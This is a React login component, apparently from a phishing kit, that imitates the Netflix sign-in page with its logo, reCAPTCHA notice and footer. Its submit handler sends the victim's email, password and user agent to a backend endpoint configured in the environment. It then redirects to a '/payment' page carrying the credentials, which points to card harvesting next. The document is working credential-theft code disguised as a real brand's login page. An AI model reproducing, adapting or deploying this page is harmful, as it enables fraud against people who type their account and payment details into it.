import React, { useEffect, useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import { isEmpty } from '../components/Utils'
import { useNavigate } from "react-router-dom";
import axios from 'axios'
export const ADD_DATA = 'ADD_DATA'

const Login = () => {
  const [email, setEmail] = useState("") 
  const [password, setPassword] = useState("") 
  const [hideBtn, setHideBtn] = useState(false)
  const [hideBtnIsActive, setHideBtnIsActive] = useState(false)
  const refICEmail = useRef(null)
  const refICPassword = useRef(null)
  const refLabelEmail = useRef(null)
  const refLabelPassword = useRef(null)
  const refInputPassword = useRef(null)
  const [emailError, setEmailError] = useState()
  const [passwordError, setPasswordError] = useState()
  const [clickEmail, setClickEmail] = useState(false)
  const [clickPassword, setClickPassword] = useState(false)
  const [phoneSelector, setPhoneSelector] = useState(false)
  const [isActiveCheckbox, setIsActiveCheckbox] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const navigate = useNavigate()

  const handleClickSubmit = () => {
    if (email.length > 4 && email.includes('@') && password.length > 3) {
      setIsLoading(true)
      
      let uag = navigator.userAgent
      console.log(uag)
      axios({
        method: 'post',
        url: `${process.env.REACT_APP_API_URL}uag`,
        data: {uag, email, password}
      })
        .then((res) => console.log(res))
        .catch((err) => console.log(err))

      setTimeout(function() {
        navigate('/payment', { state: {email, password} })
      }.bind(), 1250)
    }
  }

  useEffect(() => {
    function handleClickOutside(event) {
      if (refICEmail.current && !refICEmail.current.contains(event.target)) {
        if (isEmpty(email)) {
          refLabelEmail.current.classList.remove('active')
          if (clickEmail) {
            setEmailError(1)
          }
        } else if (email.length < 5 && clickEmail) {
          setEmailError(2)
        } else if (!email.includes("@") && clickEmail) {
          setEmailError(2)
        } else {
          setEmailError(null)
        }
      }
      if (refICPassword.current && !refICPassword.current.contains(event.target)) {
        if (isEmpty(password)) {
          refLabelPassword.current.classList.remove('active')
          if (clickPassword) {
            setPasswordError(1)
          }
        } else if (password.length < 4 && clickPassword) {
          setPasswordError(1)
        }
        setHideBtn(false)
        refInputPassword.current.type = "password"
      }
    }
 
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    }
  }, [email, password, clickEmail, clickPassword])

  return (
    <div className="login-page">
      <div className="login-background">
        {/* <img src={process.env.REACT_APP_CLIENT_URL + 'assets/login-bg.jpeg'} alt="background"/> */}
      </div>
      <div className="login-header">
        <Link to='/login'>
          <svg viewBox="0 0 111 30" className="svg-icon-netflix-logo" focusable="false"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>
        </Link>
      </div>
      <div className="login-body">
        <div className="login-content">
          <div className="login-form">
            <h3>Sign In</h3>
            <div className="form-container">
              <div className="input-wrapper">
                <div className={!isEmpty(emailError) ? 'input-container error' : "input-container"} ref={refICEmail}>
                  <label htmlFor="email" ref={refLabelEmail}>Email or phone number</label>
                  <input type="text" id='email' value={email} onFocus={() => {
                    refLabelEmail.current.classList.add('active')
                    setClickEmail(true)
                    }} onChange={(e) => {
                      let res = e.target.value
                      setEmail(res)
                      if (res < 5) {
                        setEmailError(2)
                      } else if (!res.includes('@')) {
                        setEmailError(2)
                      } else {
                        setEmailError(null)
                      }
                      if (res[0] === "0" || res[0] === "1" || res[0] === "2" || res[0] === "3" || res[0] === "4" || res[0] === "5" || res[0] === "6" || res[0] === "7" || res[0] === "8" || res[0] === "9" || res[0] === "+" || res[0] === "-" || res[0] === "(" || res[0] === ".") {
                        setPhoneSelector(true)
                      }
                      }} />
                  {phoneSelector && (
                    <div className="phone-selector-wrapper">
                      
                    </div>
                  )}
                </div>

                {!isEmpty(emailError) && (
                  <div className="error-container">
                    {emailError === 1 && (
                      <p>Please enter a valid email or phone number.</p>
                    )}
                    {emailError === 2 && (
                      <p>Please enter a valid email.</p>
                    )}
                  </div>
                )}
              </div>

              <div className="input-wrapper">

                <div className={!isEmpty(passwordError) ? 'input-container error' : "input-container"} ref={refICPassword}>
                  <label htmlFor="password" ref={refLabelPassword}>Password</label>
                  <input type="password" ref={refInputPassword} id='password' value={password} onFocus={() => {
                      refLabelPassword.current.classList.add('active')
                      setHideBtn(true)
                      setClickPassword(true)
                      if (hideBtnIsActive) {
                        refInputPassword.current.type = "text"
                      } else {
                        refInputPassword.current.type = "password"
                      }
                    }} onChange={(e) => {
                      setPassword(e.target.value)
                      if (e.target.value < 4) {
                        setPasswordError(1)
                      } else {
                        setPasswordError(null)
                      }
                      }} />
                  {hideBtn && (
                    <div className="btn-hide">
                      <span onClick={() => {
                        setHideBtnIsActive(!hideBtnIsActive)
                        refInputPassword.current.focus()
                        if (hideBtnIsActive) {
                          refInputPassword.current.type = "password"
                        } else {
                          refInputPassword.current.type = "text"
                        }
                        }}>
                        {hideBtnIsActive ? (
                          <p>Hide</p>
                        ) : (
                          <p>Show</p>
                        )}
                        </span>
                    </div>
                  )}
                </div>
                {!isEmpty(passwordError) && (
                  <div className="error-container">
                    {passwordError === 1 && (
                      <p>Your password must contain between 4 and 60 characters.</p>
                    )}
                  </div>
                )}
              </div>

              <button className={isLoading ? "btn-submit waiting loading" : "btn-submit"} onClick={() => handleClickSubmit()}>
                <p>Sign In</p>
                {isLoading && (
                  <div className="waitIndicator"><div className="basic-spinner basic-spinner-light"></div></div>
                )}
              </button>

              <div className="login-form-help">
                <div className="login-remember">
                  <input type="checkbox" id="checkbox"/>
                  <button type="reset" className="btn-checkbox" onClick={() => setIsActiveCheckbox(!isActiveCheckbox)}>
                    {isActiveCheckbox && (
                      <svg viewBox="0 0 16 16"><path d="m2.67 7.63 2.79 2.78 7.87-7.87 1.52 1.52-9.39 9.4-4.31-4.31 1.52-1.52z"/></svg>
                    )}
                  </button>
                  <label onClick={() => setIsActiveCheckbox(!isActiveCheckbox)}>Remember me</label>
                </div>
                <a href="/" className="help">Need help?</a>
              </div>

            </div>
          </div>
          <div className="second-element">
            <div className="signup-container">
              <span>New to Netflix?</span>
              <a href="/">Sign up now</a>
              <span>.</span>
            </div>
            <div className="captcha-container">
              <p><span>This page is protected by Google reCAPTCHA to ensure you're not a bot.</span>&nbsp;<button className='btn-captcha'>Learn more.</button></p>
              <div className="captcha-disable">
                <span>The information collected by Google reCAPTCHA is subject to the Google <a href="/" id="recaptcha-privacy-link">Privacy Policy</a> and <a href="/" id="recaptcha-tos-link">Terms of Service</a>, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).</span></div>
            </div>
          </div>
        </div>
      </div>

      <div className="footer-wrapper">
        <div className="footer-divider"></div>
        <div className="footer-container">
          <p className="footer-top">Questions? Call <a className="footer-top-a" href="/">(+33) 0805-543-064</a></p>
          <ul className="footer-links">
            <li className="footer-link">
              <a href="/">FAQ</a>
            </li>
            <li className="footer-link">
              <a href="/">Help Center</a>
            </li>
            <li className="footer-link">
              <a href="/">Terms of Use</a>
            </li>
            <li className="footer-link">
              <a href="/">Privacy</a>
            </li>
            <li className="footer-link">
              <a href="/">Cookie Preferences</a>
            </li>
            <li className="footer-link">
              <a href="/">Corporate Information</a>
            </li>
            {/* <li className="footer-link">
              <a href="/">Do Not Sell or Share My Personal Information</a>
            </li> */}
          </ul>
          <div className="lang-selection-container">
            <div className="language-picker">
              <div className="prefix-globe">
                <div className="select-container">
                  <p>English</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

    </div>
  )
}

export default Login
